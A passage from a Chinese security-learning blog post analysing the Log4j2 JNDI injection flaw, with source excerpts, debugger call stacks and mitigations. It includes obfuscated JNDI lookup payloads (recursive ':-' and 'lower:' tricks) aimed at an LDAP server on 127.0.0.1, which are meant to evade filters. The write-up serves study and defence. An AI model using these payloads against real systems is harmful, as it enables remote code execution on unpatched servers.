+</div><p><img loading="lazy" src="https://bu.dusays.com/2025/04/13/67fb972fd9406.png" alt="image-20250413163707776" srcset="https://bu.dusays.com/2025/04/13/67fb972fd9406.png?size=small, https://bu.dusays.com/2025/04/13/67fb972fd9406.png?size=medium 1.5x, https://bu.dusays.com/2025/04/13/67fb972fd9406.png?size=large 2x" data-title="image-20250413163707776" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>打个断点调试，来到 <code>org.apache.logging.log4j.core.layout.PatternLayout</code> 下的 <code>toSerializable</code> 方法</p>
+<p>这个类中有两个 <code>toSerializable</code> 方法，由于我们在 log4j2.xml 中是使用 <code>&lt;PatternLayout pattern=&quot;${pattern1}&quot;/&gt;</code> 这种静态的配置方式，所以最后会调用到第二个 <code>toSerializable</code> 方法中的 <code>this.formatters.length</code> 来获取 ，这个类的源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">        public StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) {
+</span></span><span class="line"><span class="cl">            int len = this.formatters.length;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            for(int i = 0; i &lt; len; ++i) {
+</span></span><span class="line"><span class="cl">                this.formatters[i].format(event, buffer);
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            if (this.replace != null) {
+</span></span><span class="line"><span class="cl">                String str = buffer.toString();
+</span></span><span class="line"><span class="cl">                str = this.replace.format(str);
+</span></span><span class="line"><span class="cl">                buffer.setLength(0);
+</span></span><span class="line"><span class="cl">                buffer.append(str);
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            return buffer;
+</span></span><span class="line"><span class="cl">        }</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个类就是将日志内容按 log4j2.xml 文件中规定好的格式那样输出，我们这里的格式为 <code>[%-5p] %d %c - %m%n</code> 所以第七次循环就会处理 <code>%m</code> 也就是我们的日志消息，会调用到 <code>org.apache.logging.log4j.core.pattern.MessagePatternConverter#format</code></p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/04/13/67fb972fed29c.png" alt="image-20250413172119526" srcset="https://bu.dusays.com/2025/04/13/67fb972fed29c.png?size=small, https://bu.dusays.com/2025/04/13/67fb972fed29c.png?size=medium 1.5x, https://bu.dusays.com/2025/04/13/67fb972fed29c.png?size=large 2x" data-title="image-20250413172119526" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里的 <code>this.config</code> 就是我们实现log4j2的文件类型，这里是xml，<code>this.noLookups</code> 为 false 则代表启用 <code>${}</code> 变量替换，这里我们没有在xml中显式规定禁用，所以默认是启用的，而且我们这里本来就需要用到变量替换</p>
+<p>然后进入到 if 语句里面，如果检测到 <code>${</code> 开头，则取出从 <code>offset</code> 到当前 <code>workingBuilder</code> 末尾的内容，故这里 value 的值就为当时输入的值</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/04/13/67fb972ff1426.png" alt="image-20250413173023770" srcset="https://bu.dusays.com/2025/04/13/67fb972ff1426.png?size=small, https://bu.dusays.com/2025/04/13/67fb972ff1426.png?size=medium 1.5x, https://bu.dusays.com/2025/04/13/67fb972ff1426.png?size=large 2x" data-title="image-20250413173023770" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后调用 <code>replace()</code> ，又调用 <code>substitute()</code>，最后会调用到 <code>org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable</code>，这里的调用栈</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">resolveVariable:1106, StrSubstitutor (org.apache.logging.log4j.core.lookup)
+</span></span><span class="line"><span class="cl">substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)
+</span></span><span class="line"><span class="cl">substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
+</span></span><span class="line"><span class="cl">replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
+</span></span><span class="line"><span class="cl">format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">    <span class="n">protected</span> <span class="ne">String</span> <span class="n">resolveVariable</span><span class="p">(</span><span class="n">final</span> <span class="n">LogEvent</span> <span class="n">event</span><span class="p">,</span> <span class="n">final</span> <span class="ne">String</span> <span class="n">variableName</span><span class="p">,</span> <span class="n">final</span> <span class="n">StringBuilder</span> <span class="n">buf</span><span class="p">,</span> <span class="n">final</span> <span class="ne">int</span> <span class="n">startPos</span><span class="p">,</span> <span class="n">final</span> <span class="ne">int</span> <span class="n">endPos</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">StrLookup</span> <span class="n">resolver</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">getVariableResolver</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">resolver</span> <span class="o">==</span> <span class="n">null</span> <span class="err">?</span> <span class="n">null</span> <span class="p">:</span> <span class="n">resolver</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">variableName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>resolver</code>解析时支持的关键词有<code>[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]</code>，而我们这里利用的<code>jndi:xxx</code>后续就会用到<code>JndiLookup</code>这个解析器，调用栈</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lookup:55, JndiLookup (org.apache.logging.log4j.core.lookup)
+</span></span><span class="line"><span class="cl">lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)
+</span></span><span class="line"><span class="cl">resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后调用到log4j2原生的 <code>lookup()</code> 方法</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/04/13/67fb972fde156.png" alt="image-20250413180231646" srcset="https://bu.dusays.com/2025/04/13/67fb972fde156.png?size=small, https://bu.dusays.com/2025/04/13/67fb972fde156.png?size=medium 1.5x, https://bu.dusays.com/2025/04/13/67fb972fde156.png?size=large 2x" data-title="image-20250413180231646" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="绕过其防御" class="heading-element"><span>绕过其防御</span>
+  <a href="#%e7%bb%95%e8%bf%87%e5%85%b6%e9%98%b2%e5%be%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>先是绕过</p>
+<p>递归解析绕过：log4j2 支持表达式递归解析，下面的表达式会逐层解析，由于 <code>:-</code>是键值对的分隔符，而表达式只管取值，从而使得  <code>{::-j}</code> -&gt; <code>j</code>，类似的可以混淆其他字符。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">loggr.info(&#34;${${::-j}ndi:ldap://127.0.0.1:1099/exp}&#34;);
+</span></span><span class="line"><span class="cl">logger.info(&#34;${${,:-j}ndi:ldap://127.0.0.1:1099/exp}&#34;)</span></span></code></pre></td></tr></table>
+</div>
+</div><p>lowwer / upper 绕过：使用 log4j2 支持的关键字，实现大小写绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">logg.info(&#34;${${lower:J}ndi:ldap://127.0.0.1:1099/exp}&#34;);</span></span></code></pre></td></tr></table>
+</div>
+</div><p>防御</p>
+<p>先是最简单的，更新到最新版本或者安全版本，比如 2.15.0-rc2 安全版本，并确认不开启 JNDI Lookup ，还有些临时应急操作，比如 jvm 添加 -Dlog4j2.formatMsgNoLookups=true 参数（使得noLookup为true，不会进入到lookup中）</p>
+<h2 id="总结" class="heading-element"><span>总结</span>
+  <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>调用栈</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lookup:172, JndiManager (org.apache.logging.log4j.core.net)
+</span></span><span class="line"><span class="cl">lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)
+</span></span><span class="line"><span class="cl">lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)
+</span></span><span class="line"><span class="cl">resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)
+</span></span><span class="line"><span class="cl">substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)
+</span></span><span class="line"><span class="cl">substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
+</span></span><span class="line"><span class="cl">replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
+</span></span><span class="line"><span class="cl">format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)
+</span></span><span class="line"><span class="cl">format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)
+</span></span><span class="line"><span class="cl">toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)
+</span></span><span class="line"><span class="cl">toText:244, PatternLayout (org.apache.logging.log4j.core.layout)
+</span></span><span class="line"><span class="cl">encode:229, PatternLayout (org.apache.logging.log4j.core.layout)
+</span></span><span class="line"><span class="cl">encode:59, PatternLayout (org.apache.logging.log4j.core.layout)
+</span></span><span class="line"><span class="cl">directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
+</span></span><span class="line"><span class="cl">tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
+</span></span><span class="line"><span class="cl">append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
+</span></span><span class="line"><span class="cl">tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)
+</span></span><span class="line"><span class="cl">callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)
+</span></span><span class="line"><span class="cl">callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)
+</span></span><span class="line"><span class="cl">callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)
+</span></span><span class="line"><span class="cl">callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)
+</span></span><span class="line"><span class="cl">processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)
+</span></span><span class="line"><span class="cl">log:481, LoggerConfig (org.apache.logging.log4j.core.config)
+</span></span><span class="line"><span class="cl">log:456, LoggerConfig (org.apache.logging.log4j.core.config)
+</span></span><span class="line"><span class="cl">log:82, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)
+</span></span><span class="line"><span class="cl">log:161, Logger (org.apache.logging.log4j.core)
+</span></span><span class="line"><span class="cl">tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)
+</span></span><span class="line"><span class="cl">logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)
+</span></span><span class="line"><span class="cl">logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)
+</span></span><span class="line"><span class="cl">logMessage:2034, AbstractLogger (org.apache.logging.log4j.spi)
+</span></span><span class="line"><span class="cl">logIfEnabled:1899, AbstractLogger (org.apache.logging.log4j.spi)
+</span></span><span class="line"><span class="cl">info:1444, AbstractLogger (org.apache.logging.log4j.spi)
+</span></span><span class="line"><span class="cl">main:16, test (com.example)</span></span></code></pre></td></tr></table>
+</div>
+</div><p>sink 点是 lo4j2 包下的 <code>JndiManager#lookup</code></p>
+<p>简单分析下后觉得确实无敌，这么刁钻的角度都能找到，这个漏洞的原理和利用都不难，但从source 分析调用到最后的sink点，真的很强，不愧是阿里，听说是codeql找到的，也不知道是不是真的，但用codeql应该轻松不少</p>
+<p>还有更多的绕过和修复，以及更深的利用分析，可以见su18师傅的文章：https://tttang.com/archive/1378/#toc_rc1</p>
+<h2 id="参考" class="heading-element"><span>参考</span>
+  <a href="#%e5%8f%82%e8%80%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><a href="https://gaorenyusi.github.io/posts/log4j2/"target="_blank" rel="external nofollow noopener noreferrer">https://gaorenyusi.github.io/posts/log4j2/</a></p>
+<p><a href="https://jaspersec.top/posts/1237655284.html"target="_blank" rel="external nofollow noopener noreferrer">https://jaspersec.top/posts/1237655284.html</a></p>
+<p><a href="https://tttang.com/archive/1378/"target="_blank" rel="external nofollow noopener noreferrer">https://tttang.com/archive/1378/</a></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2025-04-13 18:50:55">更新于 2025-04-13&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/cde7a8a/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://localhost:1313/posts/cde7a8a/" data-title="Log4j2漏洞学习" data-hashtags="Java"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/cde7a8a/" data-hashtag="Java"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://localhost:1313/posts/cde7a8a/" data-title="Log4j2漏洞学习" data-web><i class="fa-brands fa-whatsapp fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://localhost:1313/posts/cde7a8a/" data-title="Log4j2漏洞学习"><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LINE</title><path d="M19.365 9.863c.349.0.63.285.63.631.0.345-.281.63-.63.63H17.61v1.125h1.755c.349.0.63.283.63.63.0.344-.281.629-.63.629h-2.386c-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346.0.627.285.627.63.0.349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211.0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346.0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195.0.375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345.0.63.285.63.63v4.771zm-5.741.0c0 .344-.282.629-.631.629-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346.0.628.285.628.63v4.771zm-2.466.629H4.917c-.345.0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348.0.63.285.63.63v4.141h1.756c.348.0.629.283.629.63.0.344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943.0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/cde7a8a/" data-title="Log4j2漏洞学习"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://localhost:1313/posts/cde7a8a/" data-title="Log4j2漏洞学习" data-description=""><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Myspace</title><path d="M19.802 12.274A3.811 3.811.0 0023.62 8.47c0-2.101-1.71-3.795-3.818-3.795a3.816 3.816.0 00-3.818 3.81 3.817 3.817.0 003.818 3.811zm-8.602.705a3.43 3.43.0 003.435-3.424A3.43 3.43.0 0011.2 6.13 3.44 3.44.0 007.764 9.566 3.436 3.436.0 0011.2 13zm-7.8.635c1.71.0 3.093-1.38 3.093-3.081.0-1.704-1.395-3.084-3.105-3.084A3.086 3.086.0 00.3 10.539c0 1.7 1.387 3.078 3.095 3.078zm0 .705c-1.96.0-3.4 1.717-3.4 3.495v1.196c0 .17.138.31.31.31h6.18a.31.31.0 00.309-.31v-1.196c0-1.779-1.437-3.5-3.398-3.5zm7.8-.56c-2.18.0-3.78 1.915-3.78 3.891v1.331c0 .188.156.344.345.344h6.87a.344.344.0 00.342-.344V17.65c0-1.976-1.598-3.891-3.777-3.891zm8.602-.617c-2.422.0-4.197 2.126-4.197 4.323v1.477c0 .21.172.381.382.381h7.63c.21.0.383-.171.383-.381v-1.477c-.001-2.197-1.776-4.323-4.198-4.323z"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://localhost:1313/posts/cde7a8a/" data-title="Log4j2漏洞学习" data-description=""><i class="fa-brands fa-blogger fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://localhost:1313/posts/cde7a8a/" data-title="Log4j2漏洞学习"><i class="fa-brands fa-evernote fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/java/" class="post-tag" title="标签 - Java">Java</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/28dc684/" class="post-nav-item" rel="next" title="CodeQL入门">CodeQL入门<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.140.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.17-30a67c4b"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">6s6</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.17-30a67c4b"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
